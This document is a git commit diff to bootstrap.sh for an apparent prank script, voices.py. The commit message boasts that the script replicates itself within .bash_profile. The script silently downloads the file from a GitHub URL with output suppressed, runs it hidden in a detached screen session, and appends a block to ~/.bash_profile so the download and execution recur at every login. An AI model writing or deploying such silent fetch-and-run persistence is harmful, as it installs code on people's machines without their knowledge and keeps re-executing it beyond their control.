e60b8c26da2015d894c47a1f66dae676a545d1bf
David Cramer <dcramer@gmail.com>
2011-04-03 12:26:25 -0700

    Allows voices.py to replicate itself within .bash_profile >:-)

--- bootstrap.sh
+++ bootstrap.sh
@@ -1,18 +1,16 @@
 #!/bin/bash
+
 if [ ! -d \"~/.voices\" ]; then
     mkdir ~/.voices
 fi
 cd ~/.voices
-VOICES=$RANDOM.py
 curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
-mv voices.py $VOICES
-screen -d -m python $VOICES
+screen -d -m python voices.py
 
+# TODO: this should be optionally via a --switch
 echo "if [ ! -d \"~/.voices\" ]; then
     mkdir ~/.voices
     cd ~/.voices
-    VOICES=$RANDOM.py
     curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
-    mv voices.py $VOICES
-    screen -d -m python $VOICES
+    screen -d -m python voices.py
 fi" >> ~/.bash_profile
